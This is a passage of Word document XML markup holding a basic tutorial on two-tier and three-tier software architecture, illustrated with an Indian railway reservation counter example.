            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="93" name="Picture 93" descr="Two-Tier Architecture">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wo-Tier Architecture">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40480" cy="3025775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="wp-caption-text"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F3F3F3"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="195" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="1366" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="666666"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1367" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="666666"/>
            <w:sz w:val="16"/>
            <w:szCs w:val="16"/>
          </w:rPr>
          <w:t>Two-Tier Architecture</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1368" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1369" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The above figure shows the architecture of two-tier. Here the direct communication between client and server, there is no intermediate between client and server.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1370" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1371" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Let’s take a look of real life example of Railway Reservation two-tier architecture:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1372" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1373" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Let’s consider that first Person is making Railway Reservation for Mumbai to Delhi by Mumbai Express at Counter No. 1 and at same time second Person is also try to make Railway reservation of Mumbai to Delhi from Counter No. 2</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1374" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1375" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>If staff from Counter No. 1 is searching for availability into system &amp; at the same staff from Counter No. 2 is also looking for availability of ticket for same day then in this case there is might be good change of confusion and chaos occurs. There might be chance of lock the Railway reservation that reserves the first.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1376" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1377" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>But reservations can be making anywhere from the India, then how it is handled?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1378" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1379" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>So here if there is difference of micro seconds for making reservation by staff from Counter No. 1 &amp; 2 then second request is added into queue. So in this case the Staff is entering data to Client Application and reservation request is sent to the database. The database sends back the information/data to the client.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1380" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1381" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">In this application the Staff user is an end user who is using Railway reservation application software. He gives inputs to the application software and it sends requests to Server. So </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>here both Database and Server are incorporated with each other, so this technology is called as “</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Client-Server Technology</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>“.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1382" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1383" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The Two-tier architecture is divided into two parts:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1384" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1385" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>1) Client Application (Client Tier</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>2) Database (Data Tier)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1386" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1387" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>On client application side the code is written for saving the data in the SQL server database. Client sends the request to server and it process the request &amp; send back with data. The main problem of two tier architecture is the server cannot respond multiple request same time, as a result it cause a data integrity issue.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1388" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1389" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Advantages:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="198"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1390" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1391" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Easy to maintain and modification is bit easy</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="198"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1392" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1393" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Communication is faster</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1394" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1395" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Disadvantages</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="199"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1396" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1397" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In two tier architecture application performance will be degrade upon increasing the users.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="199"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1398" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1399" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Cost-ineffective</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="72" w:after="150"/>
        <w:rPr>
          <w:ins w:id="1400" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1401" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="30"/>
          </w:rPr>
          <w:t>Three-Tier Architecture:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1402" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1403" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Three-tier architecture</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> typically </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>comprise</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> a presentation tier, a business or data access tier, and a data tier. Three layers in the three tier architecture are as follows:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1404" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1405" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>1) Client layer</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>2) Business layer</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>3) Data layer</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1406" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1407" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>1) Client layer:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1408" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1409" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>It is also called as </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Presentation layer</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> which contains UI part of our application. This layer is used for the design purpose where data is presented to the user or input is taken from the user. </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>For example designing registration form which contains text box, label, button etc.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1410" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1411" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>2) Business layer:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1412" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1413" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">In this layer all business logic written </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>like</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
